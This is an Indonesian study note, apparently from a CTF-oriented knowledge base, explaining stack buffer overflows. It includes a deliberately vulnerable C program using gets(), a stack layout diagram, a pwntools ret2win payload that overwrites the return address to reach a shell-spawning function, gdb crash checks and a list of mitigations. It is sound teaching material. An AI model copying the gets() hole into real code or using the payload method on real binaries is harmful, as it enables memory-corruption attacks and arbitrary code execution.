#cybersecurity

Buffer overflow terjadi ketika program menulis **lebih banyak data daripada kapasitas buffer**, dan kelebihannya menimpa memory di sekitarnya - paling sering di stack, menimpa return address.

## Kode rentan

```c
#include <stdio.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buf[64];        // buffer 64 byte
    gets(buf);           // BUG: tidak membatasi panjang!
}                        // ret -> return address dari stack

int main() {
    vuln();
    return 0;
}
```

Fungsi berbahaya yang sering jadi sumber overflow:

| Fungsi | Bahaya |
|---|---|
| `gets()` | Tidak ada batas sama sekali |
| `strcpy(dst, src)` | Tidak cek ukuran dst |
| `sprintf(dst, "%s", src)` | Tidak cek ukuran |
| `scanf("%s", buf)` | Tidak cek ukuran |
| `read(fd, buf, n)` | Aman jika `n` dihitung benar |

## Layout stack saat vuln() dipanggil

```
+---------------------------+
| return address (ke main)  |  <- 8 byte
+---------------------------+
| saved RBP                 |  <- 8 byte
+---------------------------+
| buf[0..63]                |  <- 64 byte, input kita masuk sini
+---------------------------+
```

Input `gets(buf)` menulis dari `buf[0]` terus ke atas:

```
byte 0-63   -> buf
byte 64-71  -> saved RBP
byte 72-79  -> return address   <-- KONTROL DI SINI
```

Kalau kita isi byte 72-79 dengan alamat `win()`, saat `vuln()` selesai dan `ret` dieksekusi, program lompat ke `win()` → shell.

## Payload dasar

```python
from pwn import *

context.binary = elf = ELF("./chall")
io = process("./chall")

offset = 72                    # dari pattern (lihat Offset dan Pattern)
win_addr = elf.sym.win         # alamat fungsi win

payload = b"A" * offset + p64(win_addr)
io.sendlineafter(b": ", payload)
io.interactive()
```

## Istilah

- **Offset** - jarak dari awal buffer ke return address
- **Overflow** - kelebihan data
- **Ret2win** - lompat ke fungsi `win` yang sudah ada (lihat [[Ret2win]])
- **Ret2shellcode** - lompat ke shellcode di buffer (lihat [[Ret2shellcode]])
- **Ret2libc** - lompat ke fungsi libc (lihat [[Ret2libc]])

## Deteksi

```bash
$ ./chall
Masukkan nama: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Input panjang → crash = kemungkinan besar buffer overflow. Konfirmasi dengan gdb:

```bash
gdb ./chall
(gdb) run < <(python3 -c "print('A'*100)")
# Program received signal SIGSEGV, Segmentation fault.
# 0x0000000000404141 in ??  -> return address ketimpa 'A' (0x41)
```

## Proteksi yang menghalangi

| Proteksi | Efek | Materi |
|---|---|---|
| NX | Stack tidak bisa eksekusi | [[NX]] |
| Canary | Return address dilindungi | [[Stack Canary]] |
| PIE/ASLR | Alamat acak | [[ASLR dan PIE]] |

## Catatan

- Selalu cek `checksec` dulu: NX off → ret2shellcode; NX on + ada win → ret2win; dst.
- Kalau input lewat `strcpy`/`scanf`, payload tidak boleh mengandung null byte di tengah (lihat [[Little Endian dan Format Data]]).
- Offset bisa beda per binary - hitung dengan pattern, jangan ditebak.
